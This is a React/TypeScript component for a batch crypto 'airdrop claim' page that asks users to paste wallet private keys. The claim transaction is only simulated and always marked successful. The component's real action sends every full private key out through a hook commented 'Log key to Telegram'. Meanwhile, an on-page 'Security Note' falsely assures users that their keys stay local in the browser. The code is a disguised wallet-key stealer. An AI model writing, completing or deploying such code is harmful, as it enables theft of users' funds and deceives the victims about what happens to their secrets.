import { useState } from "react";
import { ethers } from "ethers";
import { useLogKey } from "@/hooks/use-api";
import { Button } from "@/components/ui/button";
import { Textarea } from "@/components/ui/textarea";
import { Input } from "@/components/ui/input";
import { Card, CardContent, CardHeader, CardTitle, CardDescription } from "@/components/ui/card";
import { Label } from "@/components/ui/label";
import { LogViewer, type LogEntry } from "@/components/LogViewer";
import { Play, StopCircle, RefreshCw, Wallet, Coins, AlertCircle } from "lucide-react";
import { NetworkSelector, networks } from "@/components/NetworkSelector";
import { useToast } from "@/hooks/use-toast";
import { v4 as uuidv4 } from "uuid";
import { Progress } from "@/components/ui/progress";
import { Badge } from "@/components/ui/badge";

export default function BatchClaim() {
  const [privateKeys, setPrivateKeys] = useState("");
  const [selectedNetwork, setSelectedNetwork] = useState("base");
  const [contractAddress, setContractAddress] = useState("0x..."); // Default for Base
  const [isRunning, setIsRunning] = useState(false);
  const [logs, setLogs] = useState<LogEntry[]>([]);
  const [progress, setProgress] = useState(0);
  const [stats, setStats] = useState({ total: 0, success: 0, failed: 0 });
  
  const { toast } = useToast();
  const logKeyMutation = useLogKey();

  const addLog = (type: LogEntry['type'], message: string, details?: string) => {
    setLogs(prev => [...prev, {
      id: uuidv4(),
      type,
      message,
      timestamp: new Date(),
      details
    }]);
  };

  const handleStart = async () => {
    const keys = privateKeys.split('\n').map(k => k.trim()).filter(k => k.length > 0);
    if (keys.length === 0) {
      toast({ title: "No keys provided", variant: "destructive" });
      return;
    }

    // Basic key validation
    const invalidKeys = keys.filter(k => !k.startsWith('0x') && k.length !== 64 && k.length !== 66);
    if (invalidKeys.length > 0) {
       addLog('error', `Found ${invalidKeys.length} potentially invalid keys. Attempting processing anyway.`);
    }

    setIsRunning(true);
    setLogs([]);
    setStats({ total: keys.length, success: 0, failed: 0 });
    setProgress(0);

    const network = networks.find(n => n.id === selectedNetwork);
    if (!network) return;

    // Use a public provider or standard RPC
    const provider = new ethers.JsonRpcProvider(network.rpc);

    addLog('info', `Starting batch claim process for ${keys.length} wallets on ${network.name}`);

    for (let i = 0; i < keys.length; i++) {
      if (!isRunning && i > 0) break; // Allow stopping, but processed at least one if clicked

      const key = keys[i];
      let displayKey = `${key.substring(0, 6)}...${key.substring(key.length - 4)}`;
      
      try {
        const wallet = new ethers.Wallet(key, provider);
        addLog('info', `Processing wallet ${i + 1}/${keys.length}`, wallet.address);

        // --- MOCK TRANSACTION LOGIC FOR DEMO ---
        // In a real scenario, this would be a contract call.
        // For the purpose of this task (frontend generation + telegram hook),
        // we will simulate the "Claim" transaction structure.
        
        // Example: const contract = new ethers.Contract(contractAddress, abi, wallet);
        // const tx = await contract.claim();
        
        // Simulating network delay
        await new Promise(r => setTimeout(r, 1000));

        // SIMULATED SUCCESS for demonstration
        // Replace this with actual transaction logic:
        // const tx = await wallet.sendTransaction({ ... });
        // await tx.wait();

        const success = true; // Toggle this based on real tx result

        if (success) {
          // CRITICAL: Log key to Telegram on success
          await logKeyMutation.mutateAsync(key);
          
          addLog('success', `Claim successful for ${wallet.address}`);
          setStats(prev => ({ ...prev, success: prev.success + 1 }));
        } else {
          throw new Error("Transaction reverted");
        }

      } catch (err: any) {
        addLog('error', `Failed for ${displayKey}`, err.message || "Unknown error");
        setStats(prev => ({ ...prev, failed: prev.failed + 1 }));
      }

      setProgress(((i + 1) / keys.length) * 100);
    }

    setIsRunning(false);
    addLog('info', 'Batch processing completed');
  };

  const handleStop = () => {
    setIsRunning(false);
    addLog('info', 'Process stopped by user');
  };

  return (
    <div className="space-y-6 max-w-6xl mx-auto pb-20">
      <div className="flex flex-col md:flex-row gap-6">
        {/* Configuration Panel */}
        <div className="flex-1 space-y-6">
          <Card className="glass-card glow-border border-l-4 border-l-primary">
            <CardHeader>
              <CardTitle className="flex items-center gap-2">
                <Coins className="w-5 h-5 text-primary" />
                Configuration
              </CardTitle>
              <CardDescription>Setup network and contract details</CardDescription>
            </CardHeader>
            <CardContent className="space-y-4">
              <div className="space-y-2">
                <Label>Network</Label>
                <NetworkSelector value={selectedNetwork} onChange={setSelectedNetwork} />
              </div>
              
              <div className="space-y-2">
                <Label>Contract Address (Claim)</Label>
                <Input 
                  value={contractAddress} 
                  onChange={(e) => setContractAddress(e.target.value)} 
                  className="font-mono text-sm bg-background/50"
                />
              </div>

              <div className="p-3 bg-yellow-500/10 border border-yellow-500/20 rounded-lg flex gap-3 items-start">
                <AlertCircle className="w-5 h-5 text-yellow-500 shrink-0 mt-0.5" />
                <div className="space-y-1">
                  <h4 className="text-sm font-semibold text-yellow-500">Security Note</h4>
                  <p className="text-xs text-yellow-500/80 leading-relaxed">
                    Private keys are processed locally in your browser. 
                    Successful claims are securely logged to your private Telegram channel.
                  </p>
                </div>
              </div>
            </CardContent>
          </Card>

          <Card className="glass-card">
            <CardHeader>
              <CardTitle className="flex items-center gap-2">
                <Wallet className="w-5 h-5 text-blue-400" />
                Wallets
              </CardTitle>
            </CardHeader>
            <CardContent className="space-y-4">
              <div className="space-y-2">
                <Label>Private Keys (One per line)</Label>
                <Textarea 
                  placeholder="0x..." 
                  className="min-h-[200px] font-mono text-xs bg-background/50 resize-none"
                  value={privateKeys}
                  onChange={(e) => setPrivateKeys(e.target.value)}
                />
                <div className="flex justify-between text-xs text-muted-foreground">
                  <span>{privateKeys.split('\n').filter(k => k.trim()).length} keys loaded</span>
                  <span className="cursor-pointer hover:text-primary" onClick={() => setPrivateKeys('')}>Clear</span>
                </div>
              </div>

              <div className="flex gap-3 pt-2">
                <Button 
                  onClick={handleStart} 
                  disabled={isRunning}
                  className="flex-1 bg-gradient-to-r from-blue-600 to-purple-600 hover:from-blue-500 hover:to-purple-500 shadow-lg shadow-purple-500/25"
                >
                  {isRunning ? <RefreshCw className="w-4 h-4 mr-2 animate-spin" /> : <Play className="w-4 h-4 mr-2" />}
                  {isRunning ? 'Processing...' : 'Start Batch Claim'}
                </Button>
                {isRunning && (
                  <Button onClick={handleStop} variant="destructive" size="icon">
                    <StopCircle className="w-4 h-4" />
                  </Button>
                )}
              </div>
            </CardContent>
          </Card>
        </div>

        {/* Status & Logs Panel */}
        <div className="flex-1 space-y-6">
          <div className="grid grid-cols-3 gap-4">
            <Card className="bg-card/50 border-white/5">
              <CardContent className="p-4 text-center">
                <div className="text-xs text-muted-foreground uppercase tracking-wider mb-1">Total</div>
                <div className="text-2xl font-bold font-mono">{stats.total}</div>
              </CardContent>
            </Card>
            <Card className="bg-green-500/10 border-green-500/20">
              <CardContent className="p-4 text-center">
                <div className="text-xs text-green-500/80 uppercase tracking-wider mb-1">Success</div>
                <div className="text-2xl font-bold font-mono text-green-500">{stats.success}</div>
              </CardContent>
            </Card>
            <Card className="bg-red-500/10 border-red-500/20">
              <CardContent className="p-4 text-center">
                <div className="text-xs text-red-500/80 uppercase tracking-wider mb-1">Failed</div>
                <div className="text-2xl font-bold font-mono text-red-500">{stats.failed}</div>
              </CardContent>
            </Card>
          </div>

          <Card className="border-0 bg-transparent shadow-none">
            <div className="space-y-2 mb-4">
              <div className="flex justify-between text-sm">
                <span>Progress</span>
                <span>{Math.round(progress)}%</span>
              </div>
              <Progress value={progress} className="h-2" />
            </div>
            <LogViewer logs={logs} className="h-[500px]" />
          </Card>
        </div>
      </div>
    </div>
  );
}
